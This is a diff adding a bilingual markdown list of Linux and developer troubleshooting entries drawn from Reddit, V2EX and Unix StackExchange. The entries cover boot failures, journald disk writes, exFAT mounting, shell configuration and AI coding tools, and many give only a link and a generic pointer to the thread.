+- https://www.reddit.com/r/linuxquestions/comments/1t8041n/desktop_effects_were_restarted_due_to_a_graphics/
+
+---
+
+#### 2921. I can't get my fans to turn on playing on HP victus
+
+**问题描述 / Problem Description**:
+Reddit r/linuxquestions discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linuxquestions/comments/1t7zt7r/i_cant_get_my_fans_to_turn_on_playing_on_hp_victus/
+
+---
+
+#### 2922. Can EndeavourOS have any benefit over CachyOS?
+
+**问题描述 / Problem Description**:
+Reddit r/linuxquestions discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linuxquestions/comments/1t7vlcs/can_endeavouros_have_any_benefit_over_cachyos/
+
+---
+
+#### 2923. System decided it can no longer find files or boot beyond initramfs, what can I do?
+
+**问题描述 / Problem Description**:
+Reddit r/linuxquestions discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linuxquestions/comments/1t7yexj/system_decided_it_can_no_longer_find_files_or/
+
+---
+
+#### 2924. Audio pop is back in F44
+
+**问题描述 / Problem Description**:
+Reddit r/linuxquestions discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linuxquestions/comments/1t7w4m6/audio_pop_is_back_in_f44/
+
+---
+
+#### 2925. Help
+
+**问题描述 / Problem Description**:
+Reddit r/linuxquestions discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linuxquestions/comments/1t7x2dt/help/
+
+---
+
+#### 2926. Pink screen of death installing 26.04
+
+**问题描述 / Problem Description**:
+Reddit r/Ubuntu discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/Ubuntu/comments/1t7v6oa/pink_screen_of_death_installing_2604/
+
+---
+
+#### 2927. Ubuntu Screen Flickering from Nvidia 595 and 580
+
+**问题描述 / Problem Description**:
+Reddit r/Ubuntu discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/Ubuntu/comments/1t7wdzj/ubuntu_screen_flickering_from_nvidia_595_and_580/
+
+---
+
+#### 2928. Has Canonical turned off access from VPN?
+
+**问题描述 / Problem Description**:
+Reddit r/Ubuntu discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/Ubuntu/comments/1t7z4e0/has_canonical_turned_off_access_from_vpn/
+
+---
+
+#### 2929. Bluetooth devices and Wi-Fi networks not detected
+
+**问题描述 / Problem Description**:
+Reddit r/Ubuntu discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/Ubuntu/comments/1t7yjnz/bluetooth_devices_and_wifi_networks_not_detected/
+
+---
+
+#### 2930. Dual boot fileshare Ubuntu x ParrotOS
+
+**问题描述 / Problem Description**:
+Reddit r/Ubuntu discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/Ubuntu/comments/1t7yi7w/dual_boot_fileshare_ubuntu_x_parrotos/
+
+---
+
+#### 2931. Cannot change terminal (kgx) theme.
+
+**问题描述 / Problem Description**:
+Reddit r/Ubuntu discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/Ubuntu/comments/1t7xu0y/cannot_change_terminal_kgx_theme/
+
+---
+
+#### 2932. Dual boot fileshare Ubuntu x ParrotOS
+
+**问题描述 / Problem Description**:
+Reddit r/linux4noobs discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linux4noobs/comments/1t7yi26/dual_boot_fileshare_ubuntu_x_parrotos/
+
+---
+
+#### 2933. switching to linux for the first time, any tips?
+
+**问题描述 / Problem Description**:
+Reddit r/linux4noobs discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linux4noobs/comments/1t80g7c/switching_to_linux_for_the_first_time_any_tips/
+
+---
+
+#### 2934. Having trouble understanding installing things off GitHub
+
+**问题描述 / Problem Description**:
+Reddit r/linux4noobs discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linux4noobs/comments/1t7vxef/having_trouble_understanding_installing_things/
+
+---
+
+#### 2935. I can't get my fans to turn on playing on HP victus
+
+**问题描述 / Problem Description**:
+Reddit r/linux4noobs discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linux4noobs/comments/1t7zswn/i_cant_get_my_fans_to_turn_on_playing_on_hp_victus/
+
+---
+
+#### 2936. Problem during encryption of the disk during installation
+
+**问题描述 / Problem Description**:
+Reddit r/linux4noobs discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linux4noobs/comments/1t7z28c/problem_during_encryption_of_the_disk_during/
+
+---
+
+#### 2937. Why is Gentoo so hard to use?
+
+**问题描述 / Problem Description**:
+Reddit r/linux4noobs discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linux4noobs/comments/1t7yluf/why_is_gentoo_so_hard_to_use/
+
+---
+
+#### 2938. Question about switching
+
+**问题描述 / Problem Description**:
+Reddit r/linux4noobs discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linux4noobs/comments/1t7q65z/question_about_switching/
+
+---
+
+#### 2939. I need help with an open source cli tool to maintain and add new features
+
+**问题描述 / Problem Description**:
+Reddit r/commandline discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/commandline/comments/1t7yua3/i_need_help_with_an_open_source_cli_tool_to/
+
+---
+
+#### 2940. PRISM: preview, sort, log, and undo messy folder cleanup from the terminal
+
+**问题描述 / Problem Description**:
+Reddit r/commandline discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/commandline/comments/1t5evi6/prism_preview_sort_log_and_undo_messy_folder/
+
+---
+
+#### 2941. [V2EX] 苹果最新妙控触摸板和 Linux 适配的好吗?
+
+**问题描述 / Problem Description**:
+鼠标滑轮有点粘手,打算试试苹果的触摸板,就是不知道适配的怎样.
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1210536#reply30
+
+---
+
+#### 2942. [V2EX] 写了个 Docker 容器无痛迁移工具
+
+**问题描述 / Problem Description**:
+支持增量迁移，自动识别 Compose depends_on 按依赖顺序恢复，以及 volume 和挂载卷。 背景是最近要把我的 Lightsail 和腾讯云，阿里云服务都迁移到 Hetzner 。 三家零零散散跑了十几个容器，有些是 Docker compose 启动，有些配置了 network ，手动迁移太痛苦了。 使用方式很简单： mico pack # 打包所有运行中的容器（以及镜像/配置/卷/网络配置）为一个 .zst 压缩包 mico unpack mico.zstd # 在目标服务器一键恢复，按依赖顺序自动重建 有需要的可以试试。 https://github.com/Ray-D
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1211508#reply6
+
+---
+
+#### 2943. [V2EX] 我被 Claude Code 搞崩后，用了这个，爽歪了
+
+**问题描述 / Problem Description**:
+最近被 Claude Code 和 codex 搞崩了几次仓库后，发现现在很多 AI Coding 最大的问题已经不是“不会写代码”，而是改着改着就开始跑偏，需求越做越歪，AI 还特别喜欢生成一大堆繁杂代码，最后看半天都不知道它到底改了啥。。。 官方 spec-kit 我也试了，确实屌，AWS 也应用了这个企业级的框架，但感觉有点重。所以自己搞了个更轻量一点的 mini-spec-kit： mini-spec-kit 核心思路就是别让 AI 上来直接一顿乱改，而是先理解需求、确认范围，梳理需求，制定计划，对齐需求，再一步一步实现，然后自动测试。 比较适合 Claude Code 、Codex
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1211492#reply0
+
+---
+
+#### 2944. [V2EX] 企业 AI 落地，审批预审是不是比聊天机器人更容易先跑出价值？
+
+**问题描述 / Problem Description**:
+最近在做企业系统 AI 自动化，越来越觉得第一个试点不一定要做聊天机器人。 比如财务付款审批里，有很多高频、明确、可复核的风险点： - 发票金额和申请金额是否一致。 - 付款公司和发票购买方是否一致。 - 收款公司和发票销售方是否一致。 - 同一发票号是否重复提交。 - 是否超过合同、订单、报价或预算额度。 - 附件是否缺合同、报价单、验收单。 我的想法是：第一阶段不让 AI 自动审批，只做预审。 AI 负责读附件和发票，规则引擎负责金额、主体、重复、额度这些确定性校验，然后在审批页输出 PASS / WARN / REJECT 和依据。 这样对原系统侵入小，也比较容易让财务复核准确率。 我整
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1211488#reply5
+
+---
+
+#### 2945. [V2EX] BoxLite —— 2K star 纪念，非常感谢 V2EX 这个社区和朋友
+
+**问题描述 / Problem Description**:
+一开始 BoxLite 只是想作为一个嵌入式 library ，内核是 rust 写的 micro-VM 现在 BoxLite 已经进化到可以嵌入，可以本地化部署，可以集群部署 记得一开始不懂 V2EX 的规则，发的帖子侵入性太强，不过社区的包容性非常强，社区的朋友立马指出了 今天 BoxLite 进入 2k star ，很大的功劳要归功于 V2EX 社区一开始的支持～
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1211461#reply2
+
+---
+
+#### 2946. [V2EX] Serverless 里怎么处理需要建立长连接的外部资源？
+
+**问题描述 / Problem Description**:
+最近在 Cloudflare Workers 上接外部 Redis / Valkey ，发现传统 Node 服务那套“建一个 Redis client 然后复用连接”的思路不太行 Worker 会冷启动、冻结、恢复或回收，模块级 client 虽然能复用，但不像常驻进程里的连接池那么可靠。实际遇到的现象是：client 看起来 ready ，但 Redis 命令经常 timeout ，后续还会引发一些连带错误。尤其是从 cloudflare 阿姆斯特丹机房到 digital ocean 班加罗尔机房的连接质量差得离谱，已经超时到无法忍受了 我现在的临时处理是：Serverless 侧不直接维护
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1211420#reply8
+
+---
+
+#### 2947. [V2EX] 基于 AI 的 Chrome 爬虫辅助插件
+
+**问题描述 / Problem Description**:
+基于 AI 的 Chrome 爬虫辅助插件，自动监听网络请求并解析 API 逻辑。 之前爬虫每次都去抓 API 然后丢给 AI 分析，很麻烦，写了个 Chrome 插件，直接去抓请求，然后丢给 AI 分析这个接口是做什么的，以及一些字段分析。 功能 自动抓取 ：实时捕获浏览器 Fetch/XHR 请求及其 Response 。 AI 接口分析 ：一键分析接口功能，自动推断字段含义及业务逻辑。 语义解析 ：让 AI 解释复杂的 JSON 结构，告别手动盲猜字段。 计划 多语言生成 ：一键生成 Python (requests/httpx), Go, Node.js 爬虫代码。 类型定义导出 ：自
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1211407#reply13
+
+---
+
+#### 2948. [V2EX] 前端 harness 有搞头吗？后端用 supabase 的数据库，直接纯前端操作！
+
+**问题描述 / Problem Description**:
+N/A
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1211404#reply6
+
+---
+
+#### 2949. [V2EX] DeepSeek V4 Pro：处于前沿的首个中文模型
+
+**问题描述 / Problem Description**:
+https://foodtruckbench.com/blog/deepseek-v4-pro 5 次运行全部成功。中位数投资回报率（ ROI ）高达 +1,257%。中位数净资产达 $27,142 。 首个跻身 Opus 4.6 、GPT-5.2 和 Grok 4.3 （最新版）同等 ROI 梯队的中国模型； 在所有受测的高级模型中，其运行表现最为出色且稳定性最高。
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1211341#reply11
+
+---
+
+#### 2950. [V2EX] Codex 推出迁移工具，协助从其他 Agent 一键迁移到 Codex
+
+**问题描述 / Problem Description**:
+网址： https://chatgpt.com/codex/switch-to-codex/ 工作原理： Codex 应用会自动检测来自其他代理的现有配置 显示全局和项目级别的配置、技能、插件以及其他可复制的设置。 Codex 启动一个新聊天以完成迁移过程。
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1211328#reply23
+
+---
+
+#### 2951. [V2EX] 千问推出了 PC 语音输入，功能和 typeless 差不多
+
+**问题描述 / Problem Description**:
+巨头随手做的东西，就把一个创新赛道里的参赛者挤死大半。 比功能，巨头随便投入点人力就能碾压。 比营销，根本不是一个量级。 比财力，比模型，这都没法比啊。。 说的就是上半年国内蛮火的闪电说。 更何况后面还有豆包的语音输入法蓄势待发。
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1211319#reply29
+
+---
+
+#### 2952. [V2EX] 教你以「上下文信息密度」为第一性原理构建最强通用 Agent
+
+**问题描述 / Problem Description**:
+写在开头 FBI Warning⚠️：如果您没有使用过 ai 工具，没有相关的编程经验，或是对这个话题不敢兴趣，请您现在就退出当前页面。它将浪费你人生中宝贵的三分钟 友情提示：如果你想设计一个自己的 agent 或者想要深入理解 agent 如何高效运行，那么花 10 分钟理解本文会是你今年迄今为止对自己的时间做出的最值得的投资 想象一个项目工程，是做加法容易？还是减法容易？做一个通用 agent ，如何兼顾所有用户需求？如何能在简洁的前提下让一个有智慧的 agent 充分自举？ GitHub： https://github.com/juntao-ai/GenericAgent 论文： htt
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1211308#reply61
+
+---
+
+#### 2953. [V2EX] openCode go + omo 使用效果一般，是我的姿势不对吗？
+
+**问题描述 / Problem Description**:
+如题，感觉 openCode go + omo 使用效果一般，而且 token 使用量耗费极大，一会儿就蹬没有了。 同样的提示语句： codex 一会儿就干完了，又快又对 glm5.1 + omo 很慢还写错好几遍 各位老哥有什么技巧可以传授一下吗？ opencode 相关的技巧都可以丢过来。 或者有没有 codex 20x 跟 claude 的中转不掺水的？
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1211237#reply40
+
+---
+
+#### 2954. [V2EX] chatgpt 的 /mnt/data 没法提取文件，问了一圈真无解
+
+**问题描述 / Problem Description**:
+chatgpt 对话过程中可以生成一些类似 .zip 文件和 .svg 文件，拿到的地址都是 /mnt/data 沙箱地址，但是这种没法把文件提取出来啊 有大神懂这个吗，实在没辙了😄
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1211211#reply6
+
+---
+
+#### 2955. [V2EX] 高强度使用了半年 claude code 后，我终于无法忍受了，并且我发现了绝佳替代
+
+**问题描述 / Problem Description**:
+直接上菜： GenericAgent https://github.com/lsdefine/GenericAgent 本人基本信息 ：国内某 top3 的计算机博士在读，大模型方向。 最近对 cc 的使用情况 ： 我最近在 github trending 上关注了 GA 这个项目，并 高强度使用了一周多（完全接管我的科研+生活） ，然后我就 卸载了 cc 、codex 和 openclaw （但是感谢 cc 曾经在我的生命中出现过，不过 openclaw 你是真的垃圾啊）。。 那么有人问了，cc 那么屌，openclaw 被吹的那么神，有什么问题？ 我想但凡用过的人此时在心里都有答案了。。
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1211200#reply245
+
+---
+
+#### 2956. [V2EX] 当前学 agent 有必要学 langchain langgraph 吗，还是 cc,hermes,openclaw 先扒一扒源码
+
+**问题描述 / Problem Description**:
+感觉出圈的 agent 好像都不是 langchain langgraph 的。
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1211167#reply10
+
+---
+
+#### 2957. systemd-journald writes an average of 16MB per hour!
+
+**问题描述 / Problem Description**:
+Tags: ubuntu, systemd, systemd-journald | Score: 1 | Views: 465 | Answers: 2 | Created: 2025-04-18
+
+**解决方案 / Solution**:
+I thought of making a lot of comments under your question, but a) that would have been too much and b) probably would have amounted to what you wanted to know from an answer, even if it wasn't primarily focused on answering your discrete questions. So. Here goes an answer instead. sudo iotop -a […] systemd-journald: Over 3h40m it wrote 60MB! You're confusing throughput with accumulated data. If my (in this case Python, but any programming language will do) program does f = open("somelogfile.bin", "wb") while(True): f.seek(0) f.write(b"x") when you just count the numbers of bytes written per second, this program writes many megabytes per second, but all it really does is update the first byte over and over. ls -l somelogfile.bin would tell you that file is 1 B large. One of the features of systemd-journal's binary log format is that it's seekable and relatively crash-safe. To achieve that, it's probably updating some fields regularly, even if it's not appending new data. (The format is publicly documented. I'm too lazy to check.) (note that write buffers can further complicate the relationship between what updating a file and writing a file to disk means.) Now, first check: How large is your journal really? journalctl --disk-usage will tell you something like 512 MB (at least it does on my machine). That number will be roundabout constant, because systemd-journald scrubs previous logs when they are old enough and you're running above a certain size threshold. Next, check what's really going on in things that get logged: journalctl -b0 -x -f -e # ^ ^ ^ ^ # | | | | # \———————————— 0: current boot's logging only # | | | (ignore things that were logged during previous boots) # | | | # \———————— add a bit more explanation # | | # \————— follow the output as it comes in live # | # \— scroll to end will show you what your system logs. Add --user to see what your user services log. Is there something scrolling by at high speeds? if not, well, then no new things are logged. If yes, that's the problem, not your logging system! (don't shoot the messenger.) If too much is happening at once, it's possible to get a bit of statistics on what logged how many messages since last boot journalctl -b0 --output=cat --output-fields=UNIT | sort | uniq --count | sort -n In that command line you already recognize -b0 as meaning "this current boot", --output=cat tells journalctl to output unformatted text, and --output-fields=UNIT tells it to only output the unit that's logging the message (not the message, not the timestamp etc). sort sorts things alphabetically, uniq -c takes sorted input and prints the count of consecutive identical lines, and the final sort -n sorts the output of that numerically. Should I be worried about my SSD system disk? I can't tell you. But my SSDs are rated for a write volume of 3 Petabytes mean time to failure, so assuming you have a smaller one with lower-quality memory, say, it's rated for 0.5 PB MTTF. That means that at 16 MB/h, 0.5·10¹⁵ B / (16·10⁶ B/h) = 31250000 h = 3567.4 a; in other words, if you had 1000 disks experiencing exactly this write load, after 3567 years, 500 would have failed. You have one disk. You would need to assume a statistic model for when hard disks fail (they obviously don't all fail at the exact same second in 3567 years. Some will fail earlier, some later, the question is the *distribution of that), which nobody knows (a datacenter SSD manufacturer might share their statistics with their high-profile customers; Google will have enough statistics themselves to be able to estimate this themselves. We just can't know.). A common statistical model for device failures is an exponential model (a lightbulb can't fail twice). This can't be correct here in detail (that's due to wear leveling, necessary transforming the failure model of the individual flash cells), but it's a starting point. It has a cumulative distribution function: F ( t , λ ) = 1 - e - λt , where t is time, and λ is the rate , which we don't know yet. But by what "mean time to failure" means, we F ( t MTTF , λ ) = 0.5, so (log being the natural logarithm) 0.5 = 1 - e - λt MTTF 0.5 = e - λt MTTF log 0.5 = log e - λt MTTF = - λt MTTF · log e = - λt MTTF , yielding the realization that λ = - log 0.5 / t MTTF , and in our case, λ = - 0.693147 / 3567.4 [1/a] = 0.00019430 / a. Which, inserted in the original cumulative density function, F ( t ) = 1 - e -0.00019430· t , means that after a realistic lifetime of t =15 years, your SSD would still be working with a probability of 0.99709; in other words, if your low-quality SSD did nothing but write logs at this rate, you'd lose it to write load within 15 years with a probability of 3 in 1000. You're fine.
+
+**参考链接 / References**:
+- https://unix.stackexchange.com/questions/793914/systemd-journald-writes-an-average-of-16mb-per-hour
+
+---
+
+#### 2958. Cgroups permission denied on Ubuntu 22.04.5 but works on Ubuntu 22.04.03
+
+**问题描述 / Problem Description**:
+Tags: ubuntu, cgroups | Score: 1 | Views: 439 | Answers: 1 | Created: 2025-04-17
+
+**解决方案 / Solution**:
+You may want to check if you should use cgroups v1 or v2 ( https://man7.org/linux/man-pages/man7/cgroups.7.html , look for the paragraph "Cgroups version 1 and version 2" and ... actually read the whole page.), as depending on the application's code (and your kernel version), some may support one or the other.
+
+**参考链接 / References**:
+- https://unix.stackexchange.com/questions/793886/cgroups-permission-denied-on-ubuntu-22-04-5-but-works-on-ubuntu-22-04-03
+
+---
+
+#### 2959. After crash, Ubuntu boots into boot menu
+
+**问题描述 / Problem Description**:
+Tags: ubuntu, boot, troubleshooting | Score: 1 | Views: 138 | Answers: 1 | Created: 2025-03-19
+
+**解决方案 / Solution**:
+Normally, this shouldn't be a problem if the system boots normally after pressing the buttons multiple times. The Windows entry is from your old installation. First step: Edit your boot order in BIOS, remove both entries, add the device where Ubuntu is installed, and reboot. Second step (optional): Edit your boot order in BIOS again, optionally remove the device or keep the entry and add Ubuntu (if present), and reboot. See what works. I sometimes get the message even when nothing has happened before, when starting my laptop. My OS is on a USB stick, and I just switch the USB port, reboot and then it boots normally without changing anything in the BIOS. That's why I asked whether it's the USB or another device.
+
+**参考链接 / References**:
+- https://unix.stackexchange.com/questions/792704/after-crash-ubuntu-boots-into-boot-menu
+
+---
+
+#### 2960. IPIP tunnel between two docker containers on separate servers
+
+**问题描述 / Problem Description**:
+Tags: ubuntu, iptables, docker, route, iproute | Score: 1 | Views: 195 | Answers: 2 | Created: 2025-03-08
+
+**解决方案 / Solution**:
+As I am not sure whether this is the reason this should probably rather be a comment than an answer but it is too much text for that... My guess is that DNAT does not work with all IP protocols. I do not see a reason why you should not be able to just rewrite IP addresses but I am not familiar with the kernel implementation so that does not mean much. There may be reasons. I remember that I once tried DNAT with IPsec packets, and that failed. I just did a quick search for what IP protocols iptables DNAT supports but did not find anything. And then I went completely crazy and had a look at the kernel source (never having done that before so without much hope) but I found this : static bool l4proto_manip_pkt(struct sk_buff *skb, unsigned int iphdroff, unsigned int hdroff, const struct nf_conntrack_tuple *tuple, enum nf_nat_manip_type maniptype) { switch (tuple->dst.protonum) { case IPPROTO_TCP: return tcp_manip_pkt(skb, iphdroff, hdroff, tuple, maniptype); case IPPROTO_UDP: return udp_manip_pkt(skb, iphdroff, hdroff, tuple, maniptype); case IPPROTO_UDPLITE: return udplite_manip_pkt(skb, iphdroff, hdroff, tuple, maniptype); case IPPROTO_SCTP: return sctp_manip_pkt(skb, iphdroff, hdroff, tuple, maniptype); case IPPROTO_ICMP: return icmp_manip_pkt(skb, iphdroff, hdroff, tuple, maniptype); case IPPROTO_ICMPV6: return icmpv6_manip_pkt(skb, iphdroff, hdroff, tuple, maniptype); case IPPROTO_DCCP: return dccp_manip_pkt(skb, iphdroff, hdroff, tuple, maniptype); case IPPROTO_GRE: return gre_manip_pkt(skb, iphdroff, hdroff, tuple, maniptype); } /* If we don't know protocol -- no error, pass it unmodified. */ return true; } I may completely misunderstand what is happening there but it seems to me that the set of protocols supported in NAT is quite limited and does not contain IPIP (or IPsec). So I guess it would make sense to try DNAT with GRE instead. If you give that a try I would be glad to know about the results.
+
+**参考链接 / References**:
+- https://unix.stackexchange.com/questions/792111/ipip-tunnel-between-two-docker-containers-on-separate-servers
+
+---
+
+#### 2961. Can't mount exfat external hard disk drive: "Volume was not properly unmounted."
+
+**问题描述 / Problem Description**:
+Tags: ubuntu, external-hdd, exfat | Score: 1 | Views: 1214 | Answers: 1 | Created: 2025-03-04
+
+**解决方案 / Solution**:
+The issue could be caused by power fluctuations, software, or simply hardware failure or due to aging. No matter what you do, even if your system has 0% errors, you should always have backups of your most important data, that’s obvious. I would try the following steps, even if some of them might not make sense! I would create a backup of the hard drive first before performing the following steps with ddrescure or dd In which case should I prefer dd over GNU ddrescue? What's the difference between ddrescue, gddrescue, and dd_rescue? Why can't ddrescue just recover blocks used by the filesystem? Does it make sense to create a backup of the hard drive using ddrescue even if no files are being displayed? Yes, it absolutely makes sense to create a backup of the hard drive using ddrescue , even if no files are being displayed Data recovery Even if no files are displayed, the data might still be present on the hard drive but inaccessible due to file system errors or corruption. ddrescue copies the raw data of the hard drive sector by sector, regardless of the file system. This means it can recover data even if the file system is damaged. Safety Before attempting any repairs (e.g. with fsck or chkdsk), it’s crucial to have a backup. Repair tools can sometimes cause further damage, especially if the hard drive is already compromised. Bad sectors ddrescue is specifically designed to bypass bad sectors and recover as much data as possible. It attempts to copy readable sectors first and then returns to the bad sectors later to try reading them again. Other Sources and Comparison of disk cloning software: Comparison of disk cloning software Cloning data from a damaged SSD USB ports, cables, a different PC, and a different OS Try other USB ports. Use a different USB cable and also try other USB ports. If you're using a USB hub, repeat the same steps again. If the hub has its own power supply, try different cables for that as well. Use a different PC if possible and repeat the steps. If at all possible, try connecting the hard drive to a Windows PC and repeat the steps. In this post, I’ve compiled a small list of tools that you can use to search for errors, repair, or recover lost data, and there are even many more available: PC was hanging, "Physical Volumes: not OK (BAD)" Errors don’t only occur in the data area, your hardware itself could have issues due to age or other factors, like physical or virtual failures. Usually, a combination of different steps and tools, like the list above and others, is used to analyze errors, and not every report or tool is 100% accurate Check/display the file format again with sudo blkid /dev/sdb1 or sudo /sbin/blkid /dev/sdb1 file -s /dev/sda1 Try to mount it again, with the file format specified using -t and other file format Mounting with the wrong file format could cause the system to attempt repairs, potentially leading to damage. So be careful! sudo mount -t exfat /dev/sdb1 /media/myself/Medias sudo mount -t ntfs /dev/sdb1 /media/myself/Medias If not already installed, install NTFS support sudo apt-get install ntfs-3g sudo mount -t ntfs-3g /dev/sdb1 /media/myself/Medias Try updating the firmware of your SSD There is a risk of losing your SSD and the data stored on it when updating to a new firmware! How to update Samsung SSD firmware from Ubuntu? Is it possible to take an image of the firmware of HDD and SSD? If nothing has helped If there are critical files on it, a professional data recovery company or specialist with the necessary tools and hardware would be required. However, this can be very expensive. Consider your options carefully and always have backups in the future. What could have caused this SSD to be no longer recoverable?
+
+**参考链接 / References**:
+- https://unix.stackexchange.com/questions/791951/cant-mount-exfat-external-hard-disk-drive-volume-was-not-properly-unmounted
+
+---
+
+#### 2962. `Sessions should be nested with care. Unset $TMUX to force.` using Byobu and Fish load on boot
+
+**问题描述 / Problem Description**:
+Tags: ubuntu, tmux, fish, byobu | Score: 1 | Views: 890 | Answers: 1 | Created: 2025-02-27
+
+**解决方案 / Solution**:
+The issue is because Byobu and Fish are both creating a individual TMUX session, causing a fatal error. It seems the newer Ubuntu versions cannot handle this. So the solution is to get Byobu to handle loading Fish shell, instead of Fish itself. Note: This assumes that you can log into and use the root account. If you have been solely using root on your server and customising it, you really shouldn't have been - root needs to stay as it is, and only for debugging purposes. Firstly you need to deactivate Fish shell: Log into the system as root . DigitalOcean has a "Recovery Console" if you have deactivated SSH for the root account. Enter chsh -s $(which bash) foobar (Replace "foobar" with the username of the account that is having the issue). This will switch to using Bash shell for the account in question. Now you should be able you log into the account, and it will just load Byobu. If you now type fish it should load a Fish shell fine, but it won't persist when you next reboot or create a new shell. Warning: If you enter chsh -s $(which fish) , you will be back to square one. So you now need to make it persist: nano ~/.byobu/bin/.tmux.conf . Enter this, which will make Byobu load Fish shell on each new shell: set -g default-shell /usr/bin/fish set -g default-command /usr/bin/fish Hit Ctrl + X , y , and then return key. That will save the changes to the file. That's it! 🙌 Byobu will now handle loading a Fish shell.
+
+**参考链接 / References**:
+- https://unix.stackexchange.com/questions/791687/sessions-should-be-nested-with-care-unset-tmux-to-force-using-byobu-and-fis
+
+---
+
+#### 2963. On Ubuntu 26.04 Desktop how to lock Firefox version?
+
+**问题描述 / Problem Description**:
+Tags: ubuntu, firefox, readonly | Score: 0 | Views: 78 | Answers: 1 | Created: 2026-05-01
+
+**解决方案 / Solution**:
+On Ubuntu 26.04, Firefox is typically installed via Snap rather than APT, so apt-mark hold firefox won’t reliably stop updates anymore. If you want to lock the version, the correct approach is to use Snap’s hold feature instead: sudo snap refresh --hold firefox That will prevent Firefox from updating until you explicitly unhold it ( sudo snap refresh --unhold firefox ). You can also hold for a specific time using something like --hold=30d .
+
+**参考链接 / References**:
+- https://unix.stackexchange.com/questions/805741/on-ubuntu-26-04-desktop-how-to-lock-firefox-version
+
+---
+
+#### 2964. Cleaning-up previous kernel RPMs after reboot
+
+**问题描述 / Problem Description**:
+Tags: linux, bash, awk, rpm | Score: 0 | Views: 142 | Answers: 2 | Created: 2025-10-23
+
+**解决方案 / Solution**:
+Not 100% accurate but simple enough: rpm -qa | awk -F- -v r="$(uname -r)" '$1 == "kernel" && !index($0, r)'
+
+**参考链接 / References**:
+- https://unix.stackexchange.com/questions/800706/cleaning-up-previous-kernel-rpms-after-reboot
+
+---
+
+#### 2965. rsync with --include-from breaks hardlinks (evec with -H)
+
+**问题描述 / Problem Description**:
+Tags: linux, rsync, hard-link | Score: 0 | Views: 94 | Answers: 1 | Created: 2025-10-21
+
+**解决方案 / Solution**:
+OK, the problem was simple. --includes-from= is waiting for regexp from files to import. My file didn't have regexp but file names, sometimes with spaces or other special character, making them ignored by --includes-from . The very simple solution is to use --files-from= and droping the others include and exlude .
+
